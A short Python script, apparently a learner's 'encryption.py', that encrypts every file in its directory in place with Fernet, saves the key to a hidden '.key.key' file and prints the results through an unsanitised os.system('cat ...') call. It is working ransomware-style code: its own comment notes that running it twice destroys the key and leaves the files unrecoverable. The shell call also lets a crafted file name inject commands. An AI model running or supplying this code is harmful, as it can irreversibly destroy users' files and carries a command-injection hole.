import os
from cryptography.fernet import Fernet
files_here = []
for file in os.listdir():
	#    Excluding the necessory files
	if file == "encryption.py" or file == ".key.key" or file == "decryption.py":
		continue
	files_here.append(file)
print(f"here are the files {files_here}")


key = Fernet.generate_key() #generating a key 
Fernet_obj = Fernet(key) #creating a fernet obj


#      Saving the key to a file 
with open(".key.key" ,"wb") as keyptr:
	keyptr.write(key)

#      Encrypting the contents and writing them back to the same file
for cur_file in files_here:

	with open(cur_file ,"rb") as fileptr:
		data = fileptr.read()
	encrypted_data = Fernet_obj.encrypt(data)

	with open(cur_file ,"wb") as fileptr:
		fileptr.write(encrypted_data)



#checking the contents of the files.
for cur_file in files_here:
	print(f"Contents of the File with the name {cur_file} :")
	os.system(f"cat {cur_file}")
	print("\n\n--------------------------------------------------")
	print("\n")
	print("\n")
#rerunnig this code several time makes the decryption impossible since the key changes everytime and the code encrypts an already encrypted key.
